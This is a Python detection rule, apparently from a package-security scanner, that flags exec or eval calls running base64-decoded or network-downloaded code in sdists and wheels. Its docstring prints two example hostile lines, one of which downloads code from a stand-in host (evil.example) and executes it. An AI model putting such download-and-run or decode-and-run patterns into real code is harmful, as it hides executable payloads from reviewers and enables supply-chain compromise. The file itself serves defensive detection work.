"""Code that runs code nobody can read in the source: decoded or downloaded.

    exec(base64.b64decode("aW1wb3J0IG9z..."))         # decoded
    exec(requests.get("https://evil.example").text)   # downloaded

The real code only exists at runtime, so a reviewer (or a simple text scanner)
reading the package sees nothing suspicious. Honest code has essentially no reason
to decode a blob and run it, or to download code and run it, so this is critical.

exec/eval/compile on their own aren't flagged (dataclasses and template engines
use them), and neither are decoders or network calls on their own.
"""

from __future__ import annotations

from crotalus.models import AnalysisContext, Finding
from crotalus.rules.helpers.static_code_analysis import (
    DECODERS,
    calls,
    dangerous_behaviour,
    origins,
    read,
    snippet,
)


def check(context: AnalysisContext) -> list[Finding]:
    findings = []
    for distribution, contents in (("sdist", context.sdist), ("wheel", context.wheel)):
        if contents is None:
            continue
        for path, file_contents in contents.python_files.items():
            # Running code needs exec or eval, and even `e = exec` contains the word, so
            # files without either can be skipped without parsing (the slow part).
            if "exec" not in file_contents and "eval" not in file_contents:
                continue
            py_file = read(file_contents)
            if py_file is None:
                continue

            for call_name, call_node in calls(py_file):
                if dangerous_behaviour(call_name) != "runs_code" or not call_node.args:
                    continue
                # Where the code being run came from (only the first argument is code):
                # origins are decoder calls, or calls into a network module.
                code_origins = origins(call_node.args[0], py_file)
                decoders = sorted(origin for origin in code_origins if origin in DECODERS)
                network = sorted(origin for origin in code_origins if origin not in DECODERS)
                if not decoders and not network:
                    continue

                findings.append(
                    Finding(
                        rule_id="hidden_code_exec",
                        severity="critical",
                        message=(
                            f"{call_name}() runs code from {', '.join(decoders + network)}"
                            f" in {path}"
                        ),
                        evidence={
                            "distribution": distribution,
                            "file": path,
                            "line": call_node.lineno,
                            "decoders": decoders,
                            "network": network,
                            "snippet": snippet(py_file, call_node),
                        },
                    )
                )
    return findings
